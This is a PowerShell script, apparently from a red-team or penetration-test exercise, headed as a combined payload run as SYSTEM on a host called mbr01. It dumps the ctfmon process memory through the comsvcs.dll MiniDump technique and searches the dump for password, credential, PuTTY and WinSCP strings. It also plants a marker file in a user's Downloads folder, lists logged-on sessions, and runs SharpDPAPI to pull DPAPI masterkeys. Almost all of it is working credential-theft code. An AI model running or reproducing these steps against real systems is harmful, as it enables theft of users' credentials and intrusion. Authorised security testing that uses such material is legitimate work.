# 3.5H + 3.5D + 3.5G combined payload — runs as SYSTEM on mbr01
$ErrorActionPreference = 'Continue'

Write-Output '===== 3.5H CTFMON ====='
$ctf = Get-Process -Name ctfmon -ErrorAction SilentlyContinue
if ($ctf) {
    $ctf | ForEach-Object { Write-Output "CTFMON|PID $($_.Id)|Session $($_.SessionId)|User $($_.SessionId)" }
    $target = $ctf | Select-Object -First 1
    $dump = "C:\Windows\Temp\cadre-ctfmon-$($target.Id).dmp"
    # comsvcs MiniDump (procdump not staged — alternative dump primitive)
    Start-Process -FilePath 'C:\Windows\System32\rundll32.exe' -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $($target.Id) $dump full" -Wait -NoNewWindow -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    if (Test-Path $dump) {
        $sz = (Get-Item $dump).Length
        Write-Output "CTFMON_DUMP|$dump|$sz"
        # string scan for password-ish markers (weak — user may not have typed passwords)
        $strings = Select-String -Path $dump -Pattern 'password|passwd|pwd|credential|secret|Putty|WinSCP' -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -First 5
        if ($strings) { $strings | ForEach-Object { Write-Output "CTFMON_STR|$($_.Line.Substring(0, [Math]::Min(80, $_.Line.Length)))" } } else { Write-Output 'CTFMON_NO_MATCHING_STRINGS' }
        Remove-Item $dump -ErrorAction SilentlyContinue
    } else { Write-Output 'CTFMON_DUMP_NONE' }
} else { Write-Output 'CTFMON_NOT_RUNNING' }

Write-Output '===== 3.5D FILE DETONATION (drop) ====='
$dl = 'C:\Users\analyst_cloud\Downloads'
if (Test-Path $dl) {
    $marker = Join-Path $dl 'wt035d-marker.txt'
    Set-Content -Path $marker -Value "CADRE 3.5D detonation marker - dropped as $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) on $(Get-Date -Format s)" -Encoding ASCII
    Write-Output "DROP_EXISTS $(Test-Path $marker)"
    Get-Content $marker | ForEach-Object { Write-Output "DROP_CONTENT|$_" }
    # cleanup
    Remove-Item $marker -ErrorAction SilentlyContinue
    Write-Output "DROP_CLEANED $(-not (Test-Path $marker))"
    # who is logged on / sessions
    quser 2>&1 | ForEach-Object { Write-Output "QUSER|$_" }
} else { Write-Output 'DOWNLOAD_DIR_MISSING' }

Write-Output '===== 3.5G DPAPI MASTERKEYS (SharpDPAPI) ====='
$sdp = 'C:\Windows\Temp\cadre-tools\SharpDPAPI.exe'
if (Test-Path $sdp) {
    & $sdp masterkeys 2>&1 | Select-Object -First 30 | ForEach-Object { Write-Output "DPAPI|$_" }
} else { Write-Output 'SHARPDPAPI_NOT_STAGED' }

Write-Output 'COMBINED_PAYLOAD_DONE'
